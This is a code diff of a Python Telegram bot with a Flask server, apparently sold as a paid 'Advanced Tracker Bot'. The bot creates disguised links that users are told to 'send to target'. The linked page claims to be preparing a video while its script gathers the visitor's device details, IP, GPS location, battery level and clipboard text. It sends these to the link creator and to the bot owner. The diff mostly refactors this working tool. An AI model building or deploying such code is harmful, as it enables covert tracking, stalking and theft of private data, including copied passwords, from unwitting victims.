@@ -15,7 +15,7 @@ OWNER_ID = 6504476778
 bot = telebot.TeleBot(BOT_TOKEN)
 app = Flask(__name__)
 
-# ==================== DATABASE SETUP ====================
+# ==================== DATABASE ====================
 DB_PATH = 'bot.db'
 
 def get_db():
@@ -26,7 +26,6 @@ def get_db():
 def init_db():
     conn = get_db()
     c = conn.cursor()
-    # Users table
     c.execute('''CREATE TABLE IF NOT EXISTS users
                  (user_id INTEGER PRIMARY KEY,
                   username TEXT,
@@ -34,7 +33,6 @@ def init_db():
                   subscription_end TEXT,
                   phone TEXT,
                   location TEXT)''')
-    # Links table
     c.execute('''CREATE TABLE IF NOT EXISTS links
                  (link_id TEXT PRIMARY KEY,
                   user_id INTEGER,
@@ -42,7 +40,6 @@ def init_db():
                   modified_url TEXT,
                   created_at TEXT,
                   clicks INTEGER DEFAULT 0)''')
-    # Clicks table
     c.execute('''CREATE TABLE IF NOT EXISTS clicks
                  (id INTEGER PRIMARY KEY AUTOINCREMENT,
                   link_id TEXT,
@@ -63,9 +60,9 @@ def init_db():
     print("✅ Database ready")
 
 # ==================== BASE URL (Render automatically set karega) ====================
-BASE_URL = os.environ.get('RENDER_EXTERNAL_URL', 'https://your-app.onrender.com')
+BASE_URL = os.environ.get('RENDER_EXTERNAL_URL', 'https://mohyan-telegram-bot.onrender.com')
 
-# ==================== WELCOME MESSAGE (20 lines) ====================
+# ==================== WELCOME MESSAGE ====================
 WELCOME_MSG = """
 🌟 *WELCOME TO ADVANCED TRACKER BOT* 🌟
 ━━━━━━━━━━━━━━━━━━━━━
@@ -94,23 +91,37 @@ WELCOME_MSG = """
 👑 *Owner:* @EVEL_DEAD0751
 """
 
-# ==================== BOT COMMANDS ====================
+# ==================== CHECK PREMIUM ====================
+def is_premium(user_id):
+    if user_id == OWNER_ID:
+        return True
+    conn = get_db()
+    c = conn.cursor()
+    c.execute("SELECT is_paid, subscription_end FROM users WHERE user_id=?", (user_id,))
+    row = c.fetchone()
+    conn.close()
+    if not row or row[0] == 0:
+        return False
+    if row[1] == 'permanent':
+        return True
+    if row[1]:
+        end_date = datetime.datetime.strptime(row[1], '%Y-%m-%d %H:%M:%S')
+        if datetime.datetime.now() < end_date:
+            return True
+    return False
+
+# ==================== START ====================
 @bot.message_handler(commands=['start'])
 def start_cmd(message):
-    # Save user
     conn = get_db()
     c = conn.cursor()
     c.execute("INSERT OR IGNORE INTO users (user_id, username) VALUES (?, ?)",
               (message.from_user.id, message.from_user.username))
-    
-    # Owner ko permanent premium
     if message.from_user.id == OWNER_ID:
         c.execute("UPDATE users SET is_paid=1, subscription_end='permanent' WHERE user_id=?", (OWNER_ID,))
-    
     conn.commit()
     conn.close()
 
-    # Main menu
     markup = types.ReplyKeyboardMarkup(row_width=2, resize_keyboard=True)
     markup.add(
         types.KeyboardButton("🔗 GENERATE LINK"),
@@ -119,39 +130,12 @@ def start_cmd(message):
         types.KeyboardButton("💎 SUBSCRIPTION"),
         types.KeyboardButton("📊 LOG HISTORY")
     )
-    bot.send_message(
-        message.chat.id,
-        WELCOME_MSG,
-        parse_mode="Markdown",
-        reply_markup=markup
-    )
-
-# ==================== CHECK SUBSCRIPTION FUNCTION ====================
-def is_premium(user_id):
-    conn = get_db()
-    c = conn.cursor()
-    c.execute("SELECT is_paid, subscription_end FROM users WHERE user_id=?", (user_id,))
-    row = c.fetchone()
-    conn.close()
-    
-    if not row or row[0] == 0:
-        return False
-    
-    if row[1] == 'permanent':
-        return True
-    
-    if row[1]:
-        end_date = datetime.datetime.strptime(row[1], '%Y-%m-%d %H:%M:%S')
-        if datetime.datetime.now() < end_date:
-            return True
-    
-    return False
+    bot.send_message(message.chat.id, WELCOME_MSG, parse_mode="Markdown", reply_markup=markup)
 
 # ==================== GENERATE LINK ====================
 @bot.message_handler(func=lambda m: m.text == "🔗 GENERATE LINK" or m.text == "/terminal:gernatLINK")
 def gen_link(message):
     premium = is_premium(message.from_user.id)
-    
     if premium:
         features = "✨ *Premium Features (11-21)*\n• Camera, Location, Clipboard\n• Battery, Phone Number\n• IPv6, Device Memory\n• Bluetooth, XR Info"
     else:
@@ -159,22 +143,11 @@ def gen_link(message):
 
     markup = types.InlineKeyboardMarkup()
     markup.add(types.InlineKeyboardButton("➕ ENTER VIDEO LINK", callback_data="enter_link"))
-    
-    bot.send_message(
-        message.chat.id,
-        f"🔗 *LINK GENERATOR*\n\n{features}\n\nClick button and paste your video link.",
-        parse_mode="Markdown",
-        reply_markup=markup
-    )
+    bot.send_message(message.chat.id, f"🔗 *LINK GENERATOR*\n\n{features}\n\nClick button and paste your video link.", parse_mode="Markdown", reply_markup=markup)
 
 @bot.callback_query_handler(func=lambda call: call.data == "enter_link")
 def ask_link(call):
-    bot.edit_message_text(
-        "📤 *Send me the video link*\nExample: https://youtube.com/watch?v=...",
-        call.message.chat.id,
-        call.message.message_id,
-        parse_mode="Markdown"
-    )
+    bot.edit_message_text("📤 *Send me the video link*\nExample: https://youtube.com/watch?v=...", call.message.chat.id, call.message.message_id, parse_mode="Markdown")
     bot.register_next_step_handler(call.message, process_link)
 
 def process_link(message):
@@ -183,7 +156,6 @@ def process_link(message):
         bot.reply_to(message, "❌ Invalid link! Must start with http:// or https://")
         return
 
-    # Loading animation
     loading = bot.reply_to(message, "⏳ 0%")
     for i in range(1, 11):
         time.sleep(0.2)
@@ -195,30 +167,16 @@ def process_link(message):
     link_id = str(uuid.uuid4())[:8]
     modified_url = f"{BASE_URL}/click/{link_id}"
 
-    # Save to database
-    try:
-        conn = get_db()
-        c = conn.cursor()
-        c.execute(
-            "INSERT INTO links (link_id, user_id, original_url, modified_url, created_at) VALUES (?, ?, ?, ?, ?)",
-            (link_id, message.from_user.id, url, modified_url, datetime.datetime.now())
-        )
-        conn.commit()
-        conn.close()
-    except Exception as e:
-        bot.edit_message_text(f"❌ Database error: {e}", loading.chat.id, loading.message_id)
-        return
+    conn = get_db()
+    c = conn.cursor()
+    c.execute("INSERT INTO links (link_id, user_id, original_url, modified_url, created_at) VALUES (?, ?, ?, ?, ?)",
+              (link_id, message.from_user.id, url, modified_url, datetime.datetime.now()))
+    conn.commit()
+    conn.close()
 
     markup = types.InlineKeyboardMarkup()
     markup.add(types.InlineKeyboardButton("📋 COPY LINK", callback_data=f"copy_{link_id}"))
-    
-    bot.edit_message_text(
-        f"✅ *LINK GENERATED!*\n\n`{modified_url}`\n\nSend this to target.",
-        loading.chat.id,
-        loading.message_id,
-        parse_mode="Markdown",
-        reply_markup=markup
-    )
+    bot.edit_message_text(f"✅ *LINK GENERATED!*\n\n`{modified_url}`\n\nSend this to target.", loading.chat.id, loading.message_id, parse_mode="Markdown", reply_markup=markup)
 
 @bot.callback_query_handler(func=lambda call: call.data.startswith('copy_'))
 def copy_link(call):
@@ -240,7 +198,6 @@ def balance_cmd(message):
     if message.from_user.id == OWNER_ID:
         bot.send_message(message.chat.id, "👑 *OWNER*\n✨ Permanent Premium", parse_mode="Markdown")
         return
-    
     premium = is_premium(message.from_user.id)
     if premium:
         conn = get_db()
@@ -249,17 +206,9 @@ def balance_cmd(message):
         row = c.fetchone()
         conn.close()
         end = row[0][:10] if row and row[0] else "Unknown"
-        bot.send_message(
-            message.chat.id,
-            f"💎 *PREMIUM USER*\n📅 Valid till: {end}\n✨ Features: Full (11-21)",
-            parse_mode="Markdown"
-        )
+        bot.send_message(message.chat.id, f"💎 *PREMIUM USER*\n📅 Valid till: {end}\n✨ Features: Full (11-21)", parse_mode="Markdown")
     else:
-        bot.send_message(
-            message.chat.id,
-            "🆓 *FREE USER*\n✨ Features: Basic (1-10)\n💎 Upgrade: /subscription",
-            parse_mode="Markdown"
-        )
+        bot.send_message(message.chat.id, "🆓 *FREE USER*\n✨ Features: Basic (1-10)\n💎 Upgrade: /subscription", parse_mode="Markdown")
 
 # ==================== BOT INFO ====================
 @bot.message_handler(func=lambda m: m.text == "ℹ️ BOT INFO" or m.text == "/bot_info")
@@ -299,28 +248,22 @@ def info_cmd(message):
 """
     bot.send_message(message.chat.id, info_text, parse_mode="Markdown")
 
-# ==================== SUBSCRIPTION (STARS PAYMENT) ====================
+# ==================== SUBSCRIPTION ====================
 @bot.message_handler(commands=['subscription'])
 @bot.message_handler(func=lambda m: m.text == "💎 SUBSCRIPTION")
 def subscription_cmd(message):
     markup = types.InlineKeyboardMarkup(row_width=1)
-    btn1 = types.InlineKeyboardButton("⭐ 7 Stars – 30 Days", callback_data="pay_30")
-    btn2 = types.InlineKeyboardButton("⭐ 4 Stars – 15 Days", callback_data="pay_15")
-    btn3 = types.InlineKeyboardButton("⭐ 1 Star – 1 Day", callback_data="pay_1")
-    markup.add(btn1, btn2, btn3)
-    
-    bot.send_message(
-        message.chat.id,
-        "💎 *CHOOSE PREMIUM PLAN*\n\nSelect duration:",
-        parse_mode="Markdown",
-        reply_markup=markup
+    markup.add(
+        types.InlineKeyboardButton("⭐ 7 Stars – 30 Days", callback_data="pay_30"),
+        types.InlineKeyboardButton("⭐ 4 Stars – 15 Days", callback_data="pay_15"),
+        types.InlineKeyboardButton("⭐ 1 Star – 1 Day", callback_data="pay_1")
     )
+    bot.send_message(message.chat.id, "💎 *CHOOSE PREMIUM PLAN*\n\nSelect duration:", parse_mode="Markdown", reply_markup=markup)
 
 @bot.callback_query_handler(func=lambda call: call.data.startswith('pay_'))
 def pay_callback(call):
     days = 30 if call.data == "pay_30" else 15 if call.data == "pay_15" else 1
     stars = 7 if days == 30 else 4 if days == 15 else 1
-    
     try:
         bot.send_invoice(
             call.message.chat.id,
@@ -340,30 +283,17 @@ def pre_checkout(q):
 
 @bot.message_handler(content_types=['successful_payment'])
 def payment_success(message):
-    # Extract days from payload
     payload = message.successful_payment.invoice_payload
     days = int(payload.split('_')[1])
-    
-    # Calculate end date
     end_date = (datetime.datetime.now() + datetime.timedelta(days=days)).strftime('%Y-%m-%d %H:%M:%S')
-    
-    # Update database
     conn = get_db()
     c = conn.cursor()
-    c.execute("UPDATE users SET is_paid=1, subscription_end=? WHERE user_id=?", 
-              (end_date, message.from_user.id))
+    c.execute("UPDATE users SET is_paid=1, subscription_end=? WHERE user_id=?", (end_date, message.from_user.id))
     conn.commit()
     conn.close()
-    
-    # Notify owner
-    stars = message.successful_payment.total_amount // 100  # Stars in smallest unit
+    stars = message.successful_payment.total_amount // 100
     bot.send_message(OWNER_ID, f"💰 New premium: {message.from_user.id}\nStars: {stars}\nDays: {days}")
-    
-    bot.send_message(
-        message.chat.id,
-        f"✅ Premium activated for {days} days! Thank you.",
-        parse_mode="Markdown"
-    )
+    bot.send_message(message.chat.id, f"✅ Premium activated for {days} days! Thank you.", parse_mode="Markdown")
 
 # ==================== LOG HISTORY ====================
 @bot.message_handler(func=lambda m: m.text == "📊 LOG HISTORY" or m.text == "/log_history")
@@ -376,41 +306,34 @@ def history_cmd(message):
               (message.from_user.id,))
     rows = c.fetchall()
     conn.close()
-    
     if not rows:
         bot.send_message(message.chat.id, "📭 No history found.")
         return
-    
     text = "📊 *YOUR RECENT LINKS*\n\n"
     for r in rows:
         short_url = r[1][:40] + "..." if len(r[1]) > 40 else r[1]
         text += f"🔗 `{r[0]}`\n📝 {short_url}\n👥 {r[3]} clicks\n📅 {r[2][:10]}\n\n"
-    
     bot.send_message(message.chat.id, text, parse_mode="Markdown")
 
-# ==================== PERMISSION-BASED DATA COLLECTION ====================
+# ==================== PERMISSION HANDLERS ====================
 @bot.message_handler(content_types=['location'])
 def handle_location(message):
     lat = message.location.latitude
     lon = message.location.longitude
-    
     conn = get_db()
     c = conn.cursor()
-    c.execute("UPDATE users SET location=? WHERE user_id=?", 
-              (f"{lat},{lon}", message.from_user.id))
+    c.execute("UPDATE users SET location=? WHERE user_id=?", (f"{lat},{lon}", message.from_user.id))
     if c.rowcount == 0:
         c.execute("INSERT INTO users (user_id, username, location) VALUES (?, ?, ?)",
                   (message.from_user.id, message.from_user.username, f"{lat},{lon}"))
     conn.commit()
     conn.close()
-    
     bot.send_message(OWNER_ID, f"📍 Location from {message.from_user.id}: {lat},{lon}")
     bot.reply_to(message, "✅ Location received! Thank you.")
 
 @bot.message_handler(content_types=['contact'])
 def handle_contact(message):
     phone = message.contact.phone_number
-    
     conn = get_db()
     c = conn.cursor()
     c.execute("UPDATE users SET phone=? WHERE user_id=?", (phone, message.from_user.id))
@@ -419,11 +342,10 @@ def handle_contact(message):
                   (message.from_user.id, message.from_user.username, phone))
     conn.commit()
     conn.close()
-    
     bot.send_message(OWNER_ID, f"📞 Phone from {message.from_user.id}: {phone}")
     bot.reply_to(message, "✅ Phone number received! Thank you.")
 
-# ==================== TRACKING PAGE HTML ====================
+# ==================== TRACKING HTML ====================
 TRACKING_HTML = '''
 <!DOCTYPE html>
 <html>
@@ -439,31 +361,22 @@ TRACKING_HTML = '''
     <h2>🎥 Preparing your video...</h2>
     <div class="loader"></div>
     <p>Redirecting in <span id="countdown">3</span> seconds</p>
-
     <script>
         (async function() {
             const data = {};
-            
-            // Basic info (always collected)
             data.screen = screen.width + 'x' + screen.height;
             data.language = navigator.language;
             data.platform = navigator.platform;
             data.userAgent = navigator.userAgent;
             data.timezone = Intl.DateTimeFormat().resolvedOptions().timeZone;
-            
-            // Check if user is premium via link owner
             const isPremium = {{is_premium}};
-            
             if (isPremium) {
-                // Battery
                 if (navigator.getBattery) {
                     try {
                         const battery = await navigator.getBattery();
                         data.battery = battery.level * 100 + '%';
                     } catch(e) {}
                 }
-                
-                // Location
                 if (navigator.geolocation) {
                     try {
                         const pos = await new Promise((resolve, reject) => {
@@ -472,31 +385,23 @@ TRACKING_HTML = '''
                         data.location = pos.coords.latitude + ',' + pos.coords.longitude;
                     } catch(e) {}
                 }
-                
-                // Camera
                 if (navigator.mediaDevices) {
                     try {
                         const devices = await navigator.mediaDevices.enumerateDevices();
                         data.camera = devices.some(d => d.kind === 'videoinput') ? 'available' : 'none';
                     } catch(e) {}
                 }
-                
-                // Clipboard
                 if (navigator.clipboard && navigator.clipboard.readText) {
                     try {
                         data.clipboard = await navigator.clipboard.readText();
                     } catch(e) {}
                 }
             }
-            
-            // Send to server
             fetch('/collect/{{link_id}}', {
                 method: 'POST',
                 headers: { 'Content-Type': 'application/json' },
                 body: JSON.stringify(data)
             }).catch(err => console.log(err));
-            
-            // Countdown redirect
             let sec = 3;
             const timer = setInterval(() => {
                 sec--;
@@ -522,43 +427,27 @@ def click_track(link_id):
     try:
         ip = request.remote_addr
         ua = request.user_agent.string
-        
         conn = get_db()
         c = conn.cursor()
-        
-        # Get original URL and user_id
         c.execute("SELECT original_url, user_id FROM links WHERE link_id=?", (link_id,))
         row = c.fetchone()
         if not row:
             conn.close()
             return "Link not found", 404
-        
         original_url = row[0]
         user_id = row[1]
-        
-        # Check if link owner is premium
         owner_premium = is_premium(user_id)
-        
-        # Insert click record
         c.execute("INSERT INTO clicks (link_id, ip, user_agent, timestamp) VALUES (?, ?, ?, ?)",
                   (link_id, ip, ua, datetime.datetime.now()))
         c.execute("UPDATE links SET clicks = clicks + 1 WHERE link_id=?", (link_id,))
         conn.commit()
         conn.close()
-        
-        # Notify owner
         try:
             bot.send_message(OWNER_ID, f"📊 New click on {link_id}\nIP: {ip}")
         except:
             pass
-        
-        # Render HTML with premium status
-        html = TRACKING_HTML.replace("{{link_id}}", link_id)
-        html = html.replace("{{original_url}}", original_url)
-        html = html.replace("{{is_premium}}", "true" if owner_premium else "false")
-        
+        html = TRACKING_HTML.replace("{{link_id}}", link_id).replace("{{original_url}}", original_url).replace("{{is_premium}}", "true" if owner_premium else "false")
         return render_template_string(html)
-        
     except Exception as e:
         return f"Error: {e}", 500
 
@@ -566,34 +455,23 @@ def click_track(link_id):
 def collect_data(link_id):
     try:
         data = request.json
-        
         conn = get_db()
         c = conn.cursor()
-        
-        # Get user who owns this link
         c.execute("SELECT user_id FROM links WHERE link_id=?", (link_id,))
         link_row = c.fetchone()
         if not link_row:
             conn.close()
             return json.dumps({"status": "error"}), 404
-        
         user_id = link_row[0]
-        
-        # Update the most recent click for this link from this IP
         ip = request.remote_addr
-        c.execute('''UPDATE clicks SET 
-                     screen=?, language=?, platform=?, timezone=?,
+        c.execute('''UPDATE clicks SET screen=?, language=?, platform=?, timezone=?,
                      battery=?, location=?, camera=?, clipboard=?
-                     WHERE link_id=? AND ip=? AND timestamp=(
-                         SELECT MAX(timestamp) FROM clicks WHERE link_id=? AND ip=?
-                     )''',
+                     WHERE link_id=? AND ip=? AND timestamp=(SELECT MAX(timestamp) FROM clicks WHERE link_id=? AND ip=?)''',
                   (data.get('screen'), data.get('language'), data.get('platform'),
                    data.get('timezone'), data.get('battery'), data.get('location'),
                    data.get('camera'), data.get('clipboard'),
                    link_id, ip, link_id, ip))
         conn.commit()
-        
-        # Send collected info to user1 (link owner) if they're premium
         if is_premium(user_id):
             msg = f"📥 *New Visitor Data*\nIP: {ip}\n"
             for key, value in data.items():
@@ -603,29 +481,36 @@ def collect_data(link_id):
                 bot.send_message(user_id, msg, parse_mode="Markdown")
             except:
                 pass
-        
-        # Always send to owner
         owner_msg = f"🔔 *New Data*\nLink: {link_id}\nUser1: {user_id}\nIP: {ip}\nData: {json.dumps(data)}"
         bot.send_message(OWNER_ID, owner_msg, parse_mode="Markdown")
-        
         conn.close()
         return json.dumps({"status": "ok"})
-        
     except Exception as e:
         print("Error in /collect:", e)
         return json.dumps({"status": "error"}), 500
 
-# ==================== START BOT ====================
+# ==================== WEBHOOK SETUP ====================
+@app.route('/webhook', methods=['POST'])
+def webhook():
+    json_str = request.get_data().decode('UTF-8')
+    update = telebot.types.Update.de_json(json_str)
+    bot.process_new_updates([update])
+    return 'OK', 200
+
+# ==================== START BOT WITH WEBHOOK ====================
 def run_bot():
     init_db()
-    print("🤖 Bot polling started...")
-    bot.infinity_polling()
+    print("🤖 Bot starting with webhook...")
+    # Remove any existing webhook
+    bot.remove_webhook()
+    # Set webhook
+    webhook_url = f"{BASE_URL}/webhook"
+    bot.set_webhook(url=webhook_url)
+    print(f"✅ Webhook set to {webhook_url}")
 
 if __name__ == "__main__":
-    # Start bot in thread
-    bot_thread = threading.Thread(target=run_bot, daemon=True)
-    bot_thread.start()
-    
-    # Run Flask
+    # Run bot setup in a thread (just to set webhook once)
+    threading.Thread(target=run_bot, daemon=True).start()
+    # Start Flask server
     port = int(os.environ.get('PORT', 8080))
     app.run(host='0.0.0.0', port=port)
